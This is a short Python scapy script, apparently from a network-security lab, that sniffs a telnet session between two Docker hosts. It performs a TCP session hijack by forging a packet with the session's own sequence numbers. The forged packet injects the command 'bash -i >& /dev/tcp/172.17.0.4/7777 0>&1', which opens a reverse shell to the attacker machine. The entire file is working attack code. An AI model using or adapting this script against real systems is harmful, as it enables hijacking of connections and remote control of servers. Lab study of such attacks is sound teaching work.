#!/usr/bin/python3
from scapy.all import *

user="172.17.0.2"
server="172.17.0.3"
attacker="172.17.0.4"

SRC=user
DST=server

sport=55500
PORT = 23


def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]
    if(old_tcp.flags!="A"):
        return
    #############################################
    ip  =  IP( src   = old_ip.src,
               dst   = old_ip.dst
             )
    tcp = TCP( sport = old_tcp.sport,
               dport = old_tcp.dport,
               seq   = old_tcp.seq,
               ack   = old_tcp.ack,
               flags = "AP"
             )
    data = "\bbash -i >& /dev/tcp/172.17.0.4/7777 0>&1\r\n"
    #############################################

    pkt = ip/tcp/data
    send(pkt,verbose=0)
    #ls(pkt)
    quit()
    
   
iface='docker0'
f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(filter=f, iface=iface,   prn=spoof)

